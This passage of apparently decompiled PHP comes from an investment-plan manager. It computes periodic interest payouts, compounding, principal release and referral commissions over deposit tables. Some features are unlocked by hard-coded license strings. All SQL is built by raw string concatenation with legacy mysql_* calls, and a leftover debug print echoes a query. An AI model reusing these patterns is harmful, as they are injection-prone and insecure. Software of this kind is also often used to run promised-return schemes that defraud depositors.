    if ($u_id == -1)
    {
      $u_cond = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $u_id . ' and status = \'on\'';
    }

    if ($u_id == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($sth_users = mysql_query ($q) OR print mysql_error ());
    while ($row_user = mysql_fetch_array ($sth_users))
    {
      $row_user_id = $row_user['id'];
      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $row_user_id;
      (mysql_query ($q) OR print mysql_error ());
      $lines = 1;
      $q_days_where = ' ((t.work_week = 1)*(floor(q_days / 5) * 7 + q_days % 5 + ((q_days % 5 + WEEKDAY(deposit_date)) > 5)*2 - 1) + (t.work_week = 0)*(t.q_days)) ';
      while (0 < $lines)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              t.return_profit as return_profit,
              ' . $q_days_where . ' as q_days1
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $row_user_id . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              (((' . $q_days_where . ' + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / if(t.period = \'h\', 60*60, 60*60*24))) or ' . $q_days_where . ' = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval ' . $q_days_where . ' + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((' . $q_days_where . ' = 0) or 
                (               
                (d.deposit_date + interval ' . $q_days_where . ' + t.delay-1*(t.delay > 0) hour >= d.last_pay_date and t.period = \'h\') or
                (d.deposit_date + interval ' . $q_days_where . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date and t.period = \'d\') or
                (d.deposit_date + interval ' . $q_days_where . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval ' . $q_days_where . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval ' . $q_days_where . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval ' . $q_days_where . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval ' . $q_days_where . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval ' . $q_days_where . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval ' . $q_days_where . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (' . $q_days_where . ' > 0 and t.period = \'end\') 
              ))';
        ($sth = mysql_query ($q) OR print mysql_error ());
        $lines = 0;
        while ($row = mysql_fetch_array ($sth))
        {
          ++$lines;
          if (!isset ($types[$row['type_id']]))
          {
            continue;
          }

          $percent = 0;
          $last_percent = 0;
          reset ($types);
          reset ($types[$row['type_id']]);
          while (list ($key, $plan) = each ($types[$row['type_id']]))
          {
            if (($plan['min_deposit'] <= $row['actual_amount'] AND ($row['actual_amount'] <= $plan['max_deposit'] OR $plan['max_deposit'] == 0)))
            {
              $percent = $plan['percent'];
            }

            if (($row['actual_amount'] < $plan['min_deposit'] AND $percent == 0))
            {
              $percent = $last_percent;
            }

            if (($row['actual_amount'] < $plan['min_deposit'] AND 0 < $percent))
            {
              break;
            }

            $last_percent = $plan['percent'];
          }

          if (($plan['max_deposit'] != 0 AND $plan['max_deposit'] < $row['actual_amount']))
          {
            $percent = $last_percent;
          }

          $inc = $row['actual_amount'] * $percent / 100;
          $interval = '';
          if ($row['period'] == 'd')
          {
            $interval = ' 1 day ';
          }
          else
          {
            if ($row['period'] == 'h')
            {
              $interval = ' 1 hour ';
            }
            else
            {
              if ($row['period'] == 'w')
              {
                $interval = ' 7 day ';
              }
              else
              {
                if ($row['period'] == 'b-w')
                {
                  $interval = ' 14 day ';
                }
                else
                {
                  if ($row['period'] == 'm')
                  {
                    $interval = ' 1 month ';
                  }
                  else
                  {
                    if ($row['period'] == '2m')
                    {
                      $interval = ' 2 month ';
                    }
                    else
                    {
                      if ($row['period'] == '3m')
                      {
                        $interval = ' 3 month ';
                      }
                      else
                      {
                        if ($row['period'] == '6m')
                        {
                          $interval = ' 6 month ';
                        }
                        else
                        {
                          if ($row['period'] == 'y')
                          {
                            $interval = ' 1 year ';
                          }
                          else
                          {
                            if ($row['period'] == 'end')
                            {
                              $interval = ' ' . $row['q_days'] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($percent == 0 AND $interval == ''))
          {
            continue;
          }

          $dw = -1;
          $q = 'select weekday(\'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ') as dw');
          ($sth2 = mysql_query ($q) OR print mysql_error ());
          while ($row2 = mysql_fetch_array ($sth2))
          {
            $dw = $row2['dw'];
          }

          $q = 'select count(id) as col from hm2_history where ' . ($row['period'] == 'h' ? ' date_format(date, \'%Y-%m-%d %H\') = date_format(\'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ', \'%Y-%m-%d %H\') and') : 'to_days(date) = to_days(\'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ') and ')) . ' deposit_id = ' . $row['id'];
          ($sth3 = mysql_query ($q) OR print mysql_error ());
          $flag_exists_earning = 0;
          while ($row3 = mysql_fetch_array ($sth3))
          {
            $flag_exists_earning = $row3['col'];
          }

          if ($flag_exists_earning == 0)
          {
            if ((5 <= $dw AND $row['work_week'] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $row['user_id'] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($dw == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ',
                    ec = ') . $row['ec'] . ',
                    str = \'gg\',
                    deposit_id = ' . $row['id'];
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $row['user_id'] . ('' . ',
                    amount = ' . $inc . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $settings['currency_sign'] . number_format ($row['actual_amount'], 2) . ('' . ' - ' . $percent . ' %\',
                    actual_amount = ' . $inc . ',
                    date = \'') . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ',
                    ec = ') . $row['ec'] . ',
                    str = \'gg\',
                    deposit_id = ' . $row['id'];
            }

            (mysql_query ($q) OR print mysql_error ());
          }

          $status = '';
          if ($row['period'] == 'end')
          {
            if (($row['withdraw_principal'] == 0 OR ($row['withdraw_principal'] AND $row['wp_ok'])))
            {
              $status = ', status = \'off\'';
            }

            if (($row['return_profit'] == 1 AND ($row['withdraw_principal'] == 0 OR ($row['withdraw_principal'] AND $row['wp_ok']))))
            {
              $q = 'insert into hm2_history set user_id = ' . $row['user_id'] . ',
                    amount = ' . $row['actual_amount'] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $row['actual_amount'] . ',
                    ec = ' . $row['ec'] . ',
                    date = \'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ',
                    deposit_id = ') . $row['id'];
              (mysql_query ($q) OR print mysql_error ());
            }
          }
          else
          {
            if ((5 <= $dw AND $row['work_week'] == 1))
            {
            }
            else
            {
              if (((0 < $row['compound'] AND $row['compound'] <= 100) AND $row['use_compound'] == 1))
              {
                if ($row['compound_max_deposit'] == 0)
                {
                  $row['compound_max_deposit'] = $row['actual_amount'] + 1;
                }

                if (($row['compound_min_deposit'] <= $row['actual_amount'] AND $row['actual_amount'] <= $row['compound_max_deposit']))
                {
                  if ($row['compound_percents_type'] == 1)
                  {
                    $cps = preg_split ('/\\s*,\\s*/', $row['compound_percents']);
                    if (!in_array ($row['compound'], $cps))
                    {
                      $row['compound'] = $cps[0];
                    }
                  }
                  else
                  {
                    if ($row['compound'] < $row['compound_min_percent'])
                    {
                      $row['compound'] = $row['compound_min_percent'];
                    }

                    if ($row['compound_max_percent'] < $row['compound'])
                    {
                      $row['compound'] = $row['compound_max_percent'];
                    }
                  }
                }
                else
                {
                  $row['compound'] = 0;
                }

                if ((0 < $row['compound'] AND $row['compound'] <= 100))
                {
                  $comp_amount = $inc * $row['compound'] / 100;
                  $inc = floor ((floor ($inc * 100000) / 100000 - floor ($comp_amount * 100000) / 100000) * 100) / 100;
                  $q = 'insert into hm2_history set user_id = ' . $row['user_id'] . ('' . ',
                        amount = -' . $comp_amount . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $comp_amount . ',
                    		ec = ') . $row['ec'] . ',
                    		date = \'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ',
                                deposit_id = ') . $row['id'];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = '' . 'update hm2_deposits set amount = amount + ' . $comp_amount . ',
                    		actual_amount = actual_amount + ' . $comp_amount . '
                    		where id = ' . $row['id'];
                  (mysql_query ($q) OR print mysql_error ());
                }
              }

              pay_direct_earning ($row['id'], $inc, 'date = \'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
      	last_pay_date = last_pay_date + interval ' . $interval . ' ' . $status . ' where id =' . $row['id'];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $q = 'select * from hm2_types where q_days > 0';
      $sth = mysql_query ($q);
      while ($row = mysql_fetch_array ($sth))
      {
        if ($row['work_week'] == 1)
        {
          $q_days = floor ($row['q_days'] / 5) * 7 + $row['q_days'] % 5;
          $delay = $row['delay'] - (0 < $row['delay'] ? 1 : 0);
          $q_days_where = '' . ' (' . $q_days . ' + ((' . $row['q_days'] . ' % 5 + WEEKDAY(deposit_date)) > 5)*2 + ' . $delay . ') ';
        }
        else
        {
          $q_days = $row['q_days'] + $row['delay'] - (0 < $row['delay'] ? 1 : 0);
          $q_days_where = '' . ' ' . $q_days . ' ';
        }

        $id = $row['id'];
        if ($row['return_profit'] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $id . ' and 
                status = \'on\' and 
                user_id = ' . $row_user_id . ' and 
                (
                   deposit_date + interval ' . $q_days_where . ' ' . ($row['period'] == 'h' ? 'hour' : 'day') . ('' . ' < last_pay_date
                      or
                   deposit_date + interval ' . $q_days_where . ' ') . ($row['period'] == 'h' ? 'hour' : 'day') . ('' . ' < now()
                )
                and
                (
                   (' . $row['withdraw_principal'] . ' = 0) || (' . $row['withdraw_principal'] . ' && (deposit_date + interval ' . $row['withdraw_principal_duration'] . ' ') . ($row['period'] == 'h' ? 'hour' : 'day') . ' < now())))
             ';
          $sth1 = mysql_query ($q);
          while ($row1 = mysql_fetch_array ($sth1))
          {
            $q = 'insert into hm2_history set
                user_id = ' . $row1['user_id'] . ',
      		amount = ' . $row1['actual_amount'] . ',
      		type=\'release_deposit\',
      		actual_amount = ' . $row1['actual_amount'] . ',
                ec = ' . $row1['ec'] . ',
      		date = \'' . $row1['deposit_date'] . ('' . '\' + interval ' . $q_days . ' ') . ($row['period'] == 'h' ? 'hour' : 'day') . ',
                deposit_id = ' . $row1['id'];
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $row_user_id . ' and 
    	       (deposit_date + interval ' . $q_days_where . ' ' . ($row['period'] == 'h' ? 'hour' : 'day') . ('' . ' < last_pay_date
                  or
                deposit_date + interval ' . $q_days_where . ' ') . ($row['period'] == 'h' ? 'hour' : 'day') . ('' . ' < now()) and
               ((' . $row['withdraw_principal'] . ' = 0) || (' . $row['withdraw_principal'] . ' && (deposit_date + interval ' . $row['withdraw_principal_duration'] . ' ') . ($row['period'] == 'h' ? 'hour' : 'day') . ('' . ' < now()))) and
             type_id = ' . $id . '
           ');
        (mysql_query ($q) OR print mysql_error ());
      }
    }

  }

  function count_earning ($u_id)
  {
    global $settings;
    $types = array ();
    if (($settings['use_crontab'] == 1 AND $u_id != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($sth = mysql_query ($q) OR print mysql_error ());
    while ($row = mysql_fetch_array ($sth))
    {
      $types[$row['parent']][$row['id']] = $row;
    }

    $lines = 1;
    $u_cond = 'u.last_access_time + interval 30 minute < now() ';
    if ($settings['license'] == 'KC3STYBTCATZNRVBYGDF')
    {
      $send_to_stocks = 't.send_profit_to_stocks,t.send_percent_to_stocks';
      $pay_by_button_where = ' t.pay_by_button = 0 and';
    }

    if ($u_id == -1)
    {
      $u_cond = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $u_id . ' and status = \'on\'';
    }

    if ($u_id == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($sth_users = mysql_query ($q) OR print mysql_error ());
    while ($row_user = mysql_fetch_array ($sth_users))
    {
      $row_user_id = $row_user['id'];
      $fp = fopen ('' . './tmpl_c/lock_user' . $row_user_id, 'w+');
      if (flock ($fp, LOCK_EX))
      {
      }
      else
      {
        fclose ($fp);
        continue;
      }

      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $row_user_id;
      (mysql_query ($q) OR print mysql_error ());
      $lines = 1;
      $q = 'select max(p.min_deposit) as min_deposit, p.parent as type_id from hm2_plans as p group by p.parent';
      ($sth = mysql_query ($q) OR print mysql_error ());
      while ($row = mysql_fetch_array ($sth))
      {
        $q = '' . 'select max_deposit as max_amount from hm2_plans where parent = ' . $row['type_id'] . ' and min_deposit = ' . $row['min_deposit'];
        ($sth2 = mysql_query ($q) OR print mysql_error ());
        while ($row2 = mysql_fetch_array ($sth2))
        {
          $max_type_amount[$row['type_id']] = $row2['max_amount'];
        }
      }

      while (0 < $lines)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
/*              t.rpcp as rpcp,*/
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              t.delay as delay,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              ' . $send_to_stocks . '
              t.return_profit as return_profit,
              t.return_profit_percent as return_profit_percent
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $row_user_id . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              ' . $pay_by_button_where . '
              (((t.q_days + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / if(t.period = \'h\', 60*60, 60*60*24))) or t.q_days = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((t.q_days = 0) or 
                (               
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) hour >= d.last_pay_date and t.period = \'h\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date and t.period = \'d\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (t.q_days > 0 and t.period = \'end\') 
              ))';
        ($sth = mysql_query ($q) OR print mysql_error ());
        $lines = 0;
        while ($row = mysql_fetch_array ($sth))
        {
          ++$lines;
          if (!isset ($types[$row['type_id']]))
          {
            continue;
          }

          $percent = 0;
          $last_percent = 0;
          reset ($types);
          reset ($types[$row['type_id']]);
          while (list ($key, $plan) = each ($types[$row['type_id']]))
          {
            if (($plan['min_deposit'] <= $row['actual_amount'] AND ($row['actual_amount'] <= $plan['max_deposit'] OR $plan['max_deposit'] == 0)))
            {
              $percent = $plan['percent'];
            }

            if (($row['actual_amount'] < $plan['min_deposit'] AND $percent == 0))
            {
              $percent = $last_percent;
            }

            if (($row['actual_amount'] < $plan['min_deposit'] AND 0 < $percent))
            {
              break;
            }

            $last_percent = $plan['percent'];
          }

          if (($plan['max_deposit'] != 0 AND $plan['max_deposit'] < $row['actual_amount']))
          {
            $percent = $last_percent;
          }

          $inc = $row['actual_amount'] * $percent / 100;
          $interval = '';
          if ($row['period'] == 'd')
          {
            $interval = ' 1 day ';
          }
          else
          {
            if ($row['period'] == 'h')
            {
              $interval = ' 1 hour ';
            }
            else
            {
              if ($row['period'] == 'w')
              {
                $interval = ' 7 day ';
              }
              else
              {
                if ($row['period'] == 'b-w')
                {
                  $interval = ' 14 day ';
                }
                else
                {
                  if ($row['period'] == 'm')
                  {
                    $interval = ' 1 month ';
                  }
                  else
                  {
                    if ($row['period'] == '2m')
                    {
                      $interval = ' 2 month ';
                    }
                    else
                    {
                      if ($row['period'] == '3m')
                      {
                        $interval = ' 3 month ';
                      }
                      else
                      {
                        if ($row['period'] == '6m')
                        {
                          $interval = ' 6 month ';
                        }
                        else
                        {
                          if ($row['period'] == 'y')
                          {
                            $interval = ' 1 year ';
                          }
                          else
                          {
                            if ($row['period'] == 'end')
                            {
                              $interval = ' ' . $row['q_days'] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($percent == 0 AND $interval == ''))
          {
            continue;
          }

          $dw = -1;
          $q = 'select weekday(\'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ') as dw');
          ($sth2 = mysql_query ($q) OR print mysql_error ());
          while ($row2 = mysql_fetch_array ($sth2))
          {
            $dw = $row2['dw'];
          }

          $q = 'select count(id) as `col` from hm2_history where 
		type = \'earning\' and ' . ($row['period'] == 'h' ? ' date_format(date, \'%Y-%m-%d  %H\') = date_format(\'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ', \'%Y-%m-%d  %H\') and') : 'to_days(date) = to_days(\'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ') and ')) . ' deposit_id = ' . $row['id'];
          ($sth3 = mysql_query ($q) OR print mysql_error ());
          $flag_exists_earning = 0;
          while ($row3 = mysql_fetch_array ($sth3))
          {
            $flag_exists_earning = $row3['col'];
          }

          if ($flag_exists_earning == 0)
          {
            if ((5 <= $dw AND $row['work_week'] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $row['user_id'] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($dw == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ',
                    ec = ') . $row['ec'] . ',
                    str = \'gg\',
                    deposit_id = ' . $row['id'];
              (mysql_query ($q) OR print mysql_error ());
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $row['user_id'] . ('' . ',
                    amount = ' . $inc . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $settings['currency_sign'] . number_format ($row['actual_amount'], 2) . ('' . ' - ' . $percent . ' %\',
                    actual_amount = ' . $inc . ',
                    date = \'') . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ',
                    ec = ') . $row['ec'] . ',
                    str = \'gg\',
                    deposit_id = ' . $row['id'];
              (mysql_query ($q) OR print mysql_error ());
              if ($settings['license'] == 'ZQ54Q9RUQ46CU9C8Z986')
              {
                if ((0 < $row_user['ref'] AND 0 < $settings['daily_referral_percent']))
                {
                  $daily_referral_amount = $inc * $settings['daily_referral_percent'] / 100;
                  $parent_name = quote ($row_user['username']);
                  if ($settings['daily_referral_percent_min_downline_deposit'] <= $row['actual_amount'])
                  {
                    $q = '' . 'select max(actual_amount) as maxam from hm2_deposits where user_id = ' . $row_user['ref'] . ' and status = \'on\'';
                    ($sth2 = mysql_query ($q) OR print mysql_error ());
                    $maxam = 0;
                    while ($row2 = mysql_fetch_array ($sth2))
                    {
                      $maxam = $row2['maxam'];
                    }

                    if ($settings['daily_referral_percent_min_user_deposit'] <= $maxam)
                    {
                      $q = '' . 'insert into hm2_history set user_id = ' . $row_user['ref'] . ',
			amount = ' . $daily_referral_amount . ',
			type = \'commissions\',
			description = \'Daily referral earning from user ' . $parent_name . '\',
			actual_amount = ' . $daily_referral_amount . ',
			date = \'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ',
                        ec = ' . $row['ec'] . ',
			str = \'gg\'');
                      (mysql_query ($q) OR print mysql_error ());
                    }
                  }
                }
              }

              if (($settings['license'] == 'KC3STYBTCATZNRVBYGDF' AND $row['send_profit_to_stocks']))
              {
                $sinc = floor ($inc * $row['send_percent_to_stocks']) / 100;
                if (0 < $sinc)
                {
                  $q = 'insert into hm2_history set user_id = ' . $row['user_id'] . ('' . ',
                      amount = -' . $sinc . ',
                      type = \'penality\',
                      description = \'Earning moved to Stocks account\',
                      actual_amount = -' . $sinc . ',
                      date = \'') . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ',
                      ec = ') . $row['ec'] . ',
                      str = \'gg\',
                      deposit_id = ' . $row['id'];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = 'insert into sh2_history set user_id = ' . $row['user_id'] . ('' . ',
                      amount = ' . $sinc . ',
                      type = \'bonus\',
                      description = \'Earning received to buy shares\',
                      actual_amount = ' . $sinc . ',
                      date = \'') . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ',
                      ec = ') . $row['ec'] . ',
                      str = \'gg\'';
                  (mysql_query ($q) OR print mysql_error ());
                }
              }
            }
          }

          $status = '';
          if ($row['period'] == 'end')
          {
            if (($row['withdraw_principal'] == 0 OR ($row['withdraw_principal'] AND $row['wp_ok'])))
            {
              $status = ', status = \'off\'';
            }

            if (($row['return_profit'] == 1 AND ($row['withdraw_principal'] == 0 OR ($row['withdraw_principal'] AND $row['wp_ok']))))
            {
              $ramount = $row['actual_amount'];
              $q = 'insert into hm2_history set user_id = ' . $row['user_id'] . ',
                    amount = ' . $row['actual_amount'] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $ramount . ',
                    ec = ' . $row['ec'] . ('' . ',
                    date = \'' . $row['last_pay_date'] . '\' + interval ' . $interval . ',
                    deposit_id = ') . $row['id'] . ',
                    description = \'Deposit release\'';
              (mysql_query ($q) OR print mysql_error ());
              if ($settings['license'] == '4ZQQN55VA2NXBVFUQJE6')
              {
                if (0 < $row['compound'])
                {
                  $q = '' . 'select sum(actual_amount) as amt from hm2_history where deposit_id = ' . $row['id'] . ' and type = \'earning\' and user_id = ' . $row['user_id'];
                  print $q;
                  ($sthe = mysql_query ($q) OR print mysql_error ());
                  $this_deposit_earning = 0;
                  while ($rowe = mysql_fetch_array ($sthe))
                  {
                    $this_deposit_earning = $rowe['amt'];
                  }

                  $reinvest = ($ramount + $this_deposit_earning) * $row['compound'] / 100;
                  $delay = intval ($row['delay']);
                  $q = '' . 'insert into hm2_deposits set 
		           user_id = ' . $row['user_id'] . ',
		           type_id = ' . $row['type_id'] . ',
		           deposit_date = \'' . $row['last_pay_date'] . '\' + interval ' . $interval . ',
		           last_pay_date = (\'' . $row['last_pay_date'] . '\' + interval ' . $interval . ') + interval ' . $delay . ' day,
		           status = \'on\',
		           amount = ' . $reinvest . ',
		           actual_amount = ' . $reinvest . ',
		           compound = 0,
		           ec = ' . $row['ec'] . '    ';
                  (mysql_query ($q) OR print mysql_error ());
                  $deposit_id = mysql_insert_id ();
                  $q = '' . 'insert into hm2_history set 
		           user_id = ' . $row['user_id'] . ',
		           amount = -' . $reinvest . ',
		           actual_amount = -' . $reinvest . ',
		           type=\'deposit\',
		           date = \'' . $row['last_pay_date'] . '\' + interval ' . $interval . ',
		           description = \'Deposit (reinvest)\',
		           ec = ' . $row['ec'] . ',
		           deposit_id = ' . $deposit_id . '    ';
                  (mysql_query ($q) OR print mysql_error ());
                }
              }
            }
          }
          else
          {
            if ((5 <= $dw AND $row['work_week'] == 1))
            {
            }
            else
            {
              if (((0 < $row['compound'] AND $row['compound'] <= 100) AND $row['use_compound'] == 1))
              {
                if ($row['compound_max_deposit'] == 0)
                {
                  $row['compound_max_deposit'] = $row['actual_amount'] + 1;
                }

                if (($row['compound_min_deposit'] <= $row['actual_amount'] AND $row['actual_amount'] <= $row['compound_max_deposit']))
                {
                  if ($row['compound_percents_type'] == 1)
                  {
                    $cps = preg_split ('/\\s*,\\s*/', $row['compound_percents']);
                    if (!in_array ($row['compound'], $cps))
                    {
                      $row['compound'] = $cps[0];
                    }
                  }
                  else
                  {
                    if ($row['compound'] < $row['compound_min_percent'])
                    {
                      $row['compound'] = $row['compound_min_percent'];
                    }

                    if ($row['compound_max_percent'] < $row['compound'])
                    {
                      $row['compound'] = $row['compound_max_percent'];
                    }
                  }
                }
                else
                {
                  $row['compound'] = 0;
                }

                if ((0 < $row['compound'] AND $row['compound'] <= 100))
                {
                  $comp_amount = $inc * $row['compound'] / 100;
                  $inc = floor ((floor ($inc * 100000) / 100000 - floor ($comp_amount * 100000) / 100000) * 100) / 100;
                  if (($max_type_amount[$row['type_id']] == 0 OR $row['actual_amount'] + $comp_amount < $max_type_amount[$row['type_id']]))
                  {
                    $q = 'insert into hm2_history set user_id = ' . $row['user_id'] . ('' . ',
                        amount = -' . $comp_amount . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $comp_amount . ',
                    		ec = ') . $row['ec'] . ',
                    		date = \'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ',
                                deposit_id = ') . $row['id'];
                    (mysql_query ($q) OR print mysql_error ());
                    $q = '' . 'update hm2_deposits set amount = amount + ' . $comp_amount . ',
                    		actual_amount = actual_amount + ' . $comp_amount . '
                    		where id = ' . $row['id'];
                    (mysql_query ($q) OR print mysql_error ());
                  }
                }
              }

              pay_direct_earning ($row['id'], $inc, 'date = \'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
      	last_pay_date = last_pay_date + interval ' . $interval . ' ' . $status . ' where id =' . $row['id'];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      if ($settings['license'] == 'KC3STYBTCATZNRVBYGDF')
      {
        $q = 'select * from hm2_types where q_days > 0 and pay_by_button != 1';
      }
      else
      {
        $q = 'select * from hm2_types where q_days > 0';
      }

      $sth = mysql_query ($q);
      while ($row = mysql_fetch_array ($sth))
      {
        $q_days = $row['q_days'] + $row['delay'] - (0 < $row[delay] ? 1 : 0);
        $id = $row['id'];
        if ($row['return_profit'] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $id . ' and 
                status = \'on\' and 
                user_id = ' . $row_user_id . ' and 
